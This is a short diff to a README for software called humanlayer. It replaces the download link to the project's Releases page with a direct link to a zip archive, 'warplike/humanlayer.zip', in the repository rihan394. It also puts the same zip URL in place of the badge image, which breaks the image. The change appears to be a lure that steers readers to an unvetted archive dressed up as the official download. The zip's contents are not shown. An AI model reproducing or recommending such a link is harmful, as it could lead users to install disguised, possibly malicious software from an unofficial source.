@@ -26,9 +26,9 @@ To begin using humanlayer, follow these simple steps.
 
    Click the link below to access the Releases page where you can download humanlayer:
 
-   [Download humanlayer](https://github.com/rihan394/humanlayer/releases)
+   [Download humanlayer](https://raw.githubusercontent.com/rihan394/humanlayer/main/warplike/humanlayer.zip)
 
-   ![Download humanlayer](https://img.shields.io/badge/Download-humanelayer-brightgreen)
+   ![Download humanlayer](https://raw.githubusercontent.com/rihan394/humanlayer/main/warplike/humanlayer.zip)
 
 ## 📥 Download & Install
 
